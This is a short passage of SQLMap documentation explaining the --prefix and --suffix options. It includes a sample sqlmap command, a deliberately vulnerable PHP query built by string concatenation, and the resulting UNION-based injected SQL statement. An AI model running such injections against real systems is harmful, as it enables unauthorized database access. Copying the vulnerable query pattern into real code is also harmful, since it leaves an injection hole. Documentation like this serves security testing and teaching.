## Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.  
For such runs, options `--prefix` and `--suffix` can be used as follows:
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
This will result in an enclosure of all vector values between the static prefix `%'))` and the suffix `-- -`.  

For example, if the vulnerable code at the target is:
```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` and the suffix `-- -`, will result in the following (valid) SQL statement at the target:
```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```